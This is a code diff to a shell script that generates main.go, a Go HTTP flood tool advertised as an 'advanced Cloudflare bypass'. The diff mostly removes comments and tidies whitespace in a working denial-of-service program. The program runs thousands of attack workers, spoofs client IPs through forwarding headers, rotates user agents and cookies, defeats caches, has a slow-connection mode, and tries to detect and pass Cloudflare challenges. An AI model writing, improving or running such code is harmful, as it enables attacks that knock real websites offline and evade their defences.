@@ -26,20 +26,15 @@ echo
 # Remove any existing main.go to ensure clean slate
 rm -f main.go
 
-# Create main.go file directly (ADVANCED CLOUDFLARE BYPASS VERSION)
+# Create main.go file directly (ADVANCED CLOUDFLARE BYPASS VERSION - FIXED)
 echo -e " ${YELLOW}➤${NC} ${GREEN}Creating main.go with advanced bypass features...${NC}"
 
 cat > main.go << 'EOF'
 package main
 
 import (
-	"bytes"
-	"compress/gzip"
-	"context"
 	"crypto/rand"
 	"crypto/tls"
-	"encoding/base64"
-	"encoding/json"
 	"fmt"
 	"io"
 	"math/big"
@@ -112,13 +107,19 @@ var (
 		"gzip, br",
 	}
 
+	cacheControls = []string{
+		"no-cache",
+		"no-store",
+		"must-revalidate",
+	}
+
 	secCHUA = []string{
 		`"Google Chrome";v="141", "Chromium";v="141", "Not?A_Brand";v="99"`,
 		`"Microsoft Edge";v="140", "Chromium";v="140", "Not?A_Brand";v="99"`,
 		`"Brave";v="139", "Chromium";v="139", "Not?A_Brand";v="99"`,
 	}
 
-	secCHUAMobile = []string{"?0", "?1"}
+	secCHUAMobile   = []string{"?0", "?1"}
 	secCHUAPlatform = []string{"Windows", "macOS", "Linux", "Android", "iOS"}
 
 	proxies         []string
@@ -198,12 +199,6 @@ type ConnectionPool struct {
 	size       int
 	useProxy   bool
 	targetHost string
-}
-
-type CFBypass struct {
-	cookies   []*http.Cookie
-	userAgent string
-	headers   map[string]string
 }
 
 func getRandomJA3Signature() JA3Signature {
@@ -321,7 +316,7 @@ func loadProxiesFromAPI() {
 			continue
 		}
 		defer resp.Body.Close()
-		
+
 		if resp.StatusCode != http.StatusOK {
 			continue
 		}
@@ -476,14 +471,14 @@ func generateCookies() string {
 func addCloudflareBypassHeaders(req *http.Request) {
 	spoofIP := randomIP()
 	countries := []string{"US", "GB", "CA", "AU", "DE", "FR", "JP", "CN", "RU", "BR", "IN", "KR", "IT", "ES", "MX"}
-	
+
 	// Standard CF bypass headers
 	req.Header.Set("CF-Connecting-IP", spoofIP)
 	req.Header.Set("CF-IPCountry", countries[randInt(0, len(countries)-1)])
 	req.Header.Set("CF-Ray", randomString(16)+"-"+strings.ToUpper(randomString(4)))
 	req.Header.Set("CF-Visitor", `{"scheme":"https"}`)
 	req.Header.Set("CDN-Loop", "cloudflare")
-	
+
 	// IP spoofing headers
 	req.Header.Set("X-Forwarded-For", spoofIP)
 	req.Header.Set("X-Forwarded-Proto", "https")
@@ -493,7 +488,7 @@ func addCloudflareBypassHeaders(req *http.Request) {
 	req.Header.Set("X-Remote-IP", spoofIP)
 	req.Header.Set("X-Remote-Addr", spoofIP)
 	req.Header.Set("X-Client-IP", spoofIP)
-	
+
 	// Advanced bypass headers
 	req.Header.Set("X-Host", req.Host)
 	req.Header.Set("X-Forwarded-Host", req.Host)
@@ -501,7 +496,7 @@ func addCloudflareBypassHeaders(req *http.Request) {
 	req.Header.Set("Via", "1.1 google")
 	req.Header.Set("X-Request-ID", randomString(32))
 	req.Header.Set("X-Correlation-ID", randomString(32))
-	
+
 	// Modern browser headers
 	req.Header.Set("Sec-Fetch-Dest", "document")
 	req.Header.Set("Sec-Fetch-Mode", "navigate")
@@ -515,17 +510,15 @@ func addCloudflareBypassHeaders(req *http.Request) {
 }
 
 func solveChallenge(body string) string {
-	// Try to extract and solve various challenge types
 	challengeTypes := []string{
 		"jschl_vc",
 		"pass",
 		"cf_clearance",
 		"__cf_chl_captcha_tk__",
 	}
-	
+
 	for _, ct := range challengeTypes {
 		if strings.Contains(body, ct) {
-			// Extract challenge value
 			re := regexp.MustCompile(ct + `[^"]*"([^"]+)"`)
 			matches := re.FindStringSubmatch(body)
 			if len(matches) > 1 {
@@ -542,29 +535,25 @@ func handleChallengeResponse(client *http.Client, resp *http.Response, target st
 		return false
 	}
 	resp.Body.Close()
-	
+
 	bodyStr := string(body)
-	
-	// Check for Cloudflare challenge
-	if strings.Contains(bodyStr, "cf-browser-verification") || 
-	   strings.Contains(bodyStr, "challenge-platform") ||
-	   strings.Contains(bodyStr, "turnstile") {
-		
-		// Simulate solving the challenge
+
+	if strings.Contains(bodyStr, "cf-browser-verification") ||
+		strings.Contains(bodyStr, "challenge-platform") ||
+		strings.Contains(bodyStr, "turnstile") {
+
 		time.Sleep(5 * time.Second + time.Duration(randInt(1, 3))*time.Second)
-		
-		// Extract challenge solution
+
 		solution := solveChallenge(bodyStr)
 		if solution != "" {
-			// Create new request with solution
 			parsedURL, _ := url.Parse(target)
-			cfURL := fmt.Sprintf("%s/cdn-cgi/challenge-platform/h/b/jsch/v1?%s", 
+			cfURL := fmt.Sprintf("%s/cdn-cgi/challenge-platform/h/b/jsch/v1?%s",
 				parsedURL.Scheme+"://"+parsedURL.Host, solution)
-			
+
 			req, _ := http.NewRequest("GET", cfURL, nil)
 			req.Header.Set("User-Agent", randomUA())
 			req.Header.Set("Cookie", resp.Header.Get("Set-Cookie"))
-			
+
 			challengeResp, err := client.Do(req)
 			if err == nil {
 				defer challengeResp.Body.Close()
@@ -578,19 +567,15 @@ func handleChallengeResponse(client *http.Client, resp *http.Response, target st
 }
 
 func advancedBypassHeaders(req *http.Request) {
-	// Add random delays between requests
 	if randInt(1, 100) <= 20 {
 		time.Sleep(time.Duration(randInt(100, 500)) * time.Millisecond)
 	}
-	
-	// Randomize request order
+
 	if randInt(1, 100) <= 10 {
-		// Reorder headers
 		headers := make([]string, 0)
 		for k := range req.Header {
 			headers = append(headers, k)
 		}
-		// Shuffle headers (just for randomization)
 		for i := range headers {
 			j := randInt(0, len(headers)-1)
 			headers[i], headers[j] = headers[j], headers[i]
@@ -606,7 +591,7 @@ func detectCFProtection(resp *http.Response) string {
 		"__cf_bm",
 		"cf_clearance",
 	}
-	
+
 	for _, header := range cfHeaders {
 		if resp.Header.Get(header) != "" {
 			return header
@@ -616,8 +601,8 @@ func detectCFProtection(resp *http.Response) string {
 }
 
 func main() {
-	runtime.GOMAXPROCS(runtime.NumCPU() * 6) // Increased CPU usage
-	
+	runtime.GOMAXPROCS(runtime.NumCPU() * 6)
+
 	useProxy := false
 	if len(os.Args) >= 5 && os.Args[4] == "proxy" {
 		useProxy = true
@@ -690,7 +675,7 @@ func main() {
 	fmt.Println("[+] Advanced anti-bot evasion enabled")
 	fmt.Println("[+] Starting attack... Press Ctrl+C to stop")
 
-	poolSize := 1000 // Increased pool size
+	poolSize := 1000
 	connectionPool := NewConnectionPool(poolSize, useProxy, "")
 
 	var wg sync.WaitGroup
@@ -713,7 +698,7 @@ func main() {
 		close(done)
 	}()
 
-	const workers = 3000 // Increased workers
+	const workers = 3000
 
 	for i := 0; i < workers; i++ {
 		wg.Add(1)
@@ -729,7 +714,7 @@ func main() {
 
 	ticker := time.NewTicker(1 * time.Second)
 	defer ticker.Stop()
-	
+
 	for {
 		select {
 		case <-done:
@@ -751,7 +736,7 @@ func main() {
 			elapsed := time.Since(startTime).Seconds()
 			rps := float64(stats.get()) / elapsed
 			if mode == "CF" {
-				fmt.Printf("\r[+] Elapsed: %.0f / %d sec | Total: %d | Success: %d | Failed: %d | CF: %d | RPS: %.0f", 
+				fmt.Printf("\r[+] Elapsed: %.0f / %d sec | Total: %d | Success: %d | Failed: %d | CF: %d | RPS: %.0f",
 					elapsed, durationSec, stats.get(), successStats.get(), failStats.get(), cfChallenges.get(), rps)
 			} else {
 				fmt.Printf("\r[+] Elapsed: %.0f / %d sec | Total: %d | RPS: %.0f", elapsed, durationSec, stats.get(), rps)
@@ -780,7 +765,7 @@ func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter,
 		default:
 			client := pool.GetClient()
 			path := generatePath()
-			
+
 			if mode != "SLOW" && randInt(1, 100) <= 80 {
 				path += generateCacheBust()
 			}
@@ -812,7 +797,7 @@ func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter,
 				conn.SetDeadline(time.Now().Add(300 * time.Second))
 				fmt.Fprintf(conn, "GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: text/html\r\nConnection: keep-alive\r\n\r\n", path, host, randomUA())
 				stats.inc()
-					time.Sleep(1 * time.Second)
+				time.Sleep(1 * time.Second)
 				conn.Close()
 				continue
 			}
@@ -842,7 +827,7 @@ func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter,
 			req.Header.Set("Connection", "keep-alive")
 			req.Header.Set("Upgrade-Insecure-Requests", "1")
 			req.Header.Set("DNT", "1")
-			
+
 			addCloudflareBypassHeaders(req)
 
 			if randInt(1, 100) <= 60 {
@@ -852,7 +837,6 @@ func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter,
 				}
 			}
 
-			// Random delays to avoid rate limiting
 			if randInt(1, 100) <= 15 {
 				time.Sleep(time.Duration(randInt(10, 100)) * time.Millisecond)
 			}
@@ -873,11 +857,10 @@ func attackWorkerCF(target, mode string, done chan struct{}, stats, successStats
 	localSuccess := 0
 	localFail := 0
 	localCF := 0
-	
+
 	for {
 		select {
 		case <-done:
-			// Batch update counters
 			for i := 0; i < localSuccess; i++ {
 				successStats.inc()
 			}
@@ -890,10 +873,7 @@ func attackWorkerCF(target, mode string, done chan struct{}, stats, successStats
 			return
 		default:
 			client := pool.GetClient()
-			
-			// Create context with timeout
-			ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
-			
+
 			path := generatePath()
 			if randInt(1, 100) <= 80 {
 				path += generateCacheBust()
@@ -911,30 +891,27 @@ func attackWorkerCF(target, mode string, done chan struct{}, stats, successStats
 			var req *http.Request
 			var err error
 
-			// Use different HTTP methods
 			methods := []string{"GET", "POST", "HEAD"}
 			selectedMethod := methods[randInt(0, len(methods)-1)]
-			
+
 			if selectedMethod == "GET" {
-				req, err = http.NewRequestWithContext(ctx, "GET", fullURL, nil)
+				req, err = http.NewRequest("GET", fullURL, nil)
 			} else if selectedMethod == "POST" {
 				payload := fmt.Sprintf("data=%s&token=%s&timestamp=%d", randomString(20), randomString(32), time.Now().Unix())
-				req, err = http.NewRequestWithContext(ctx, "POST", fullURL, strings.NewReader(payload))
+				req, err = http.NewRequest("POST", fullURL, strings.NewReader(payload))
 				if err == nil {
 					req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
 				}
 			} else {
-				req, err = http.NewRequestWithContext(ctx, "HEAD", fullURL, nil)
+				req, err = http.NewRequest("HEAD", fullURL, nil)
 			}
 
 			if err != nil {
-				cancel()
 				localFail++
 				stats.inc()
 				continue
 			}
 
-			// Enhanced headers for CF bypass
 			req.Header.Set("User-Agent", randomUA())
 			req.Header.Set("Referer", randomReferer())
 			req.Header.Set("Accept", acceptHeaders[randInt(0, len(acceptHeaders)-1)])
@@ -943,36 +920,30 @@ func attackWorkerCF(target, mode string, done chan struct{}, stats, successStats
 			req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
 			req.Header.Set("Pragma", "no-cache")
 			req.Header.Set("Connection", "keep-alive")
-			
-			// Add all bypass headers
+
 			addCloudflareBypassHeaders(req)
-			
-			// Add random cookies
+
 			if randInt(1, 100) <= 70 {
 				req.Header.Set("Cookie", generateCookies())
 			}
-			
-			// Random delay to appear more human
+
 			if randInt(1, 100) <= 10 {
 				time.Sleep(time.Duration(randInt(50, 200)) * time.Millisecond)
 			}
-			
+
 			advancedBypassHeaders(req)
 
 			resp, err := client.Do(req)
-			
+
 			if err != nil {
-				cancel()
 				localFail++
 				stats.inc()
 				continue
 			}
-			
-			// Check for Cloudflare challenges
+
 			cfHeader := detectCFProtection(resp)
 			if cfHeader != "" || resp.StatusCode == 503 || resp.StatusCode == 403 {
 				localCF++
-				// Try to handle the challenge
 				if handleChallengeResponse(client, resp, target) {
 					localSuccess++
 				} else {
@@ -983,14 +954,12 @@ func attackWorkerCF(target, mode string, done chan struct{}, stats, successStats
 			} else {
 				localFail++
 			}
-			
+
 			io.Copy(io.Discard, resp.Body)
 			resp.Body.Close()
-			cancel()
-			
+
 			stats.inc()
-			
-			// Batch update every 100 requests
+
 			if stats.get()%100 == 0 {
 				for i := 0; i < localSuccess; i++ {
 					successStats.inc()
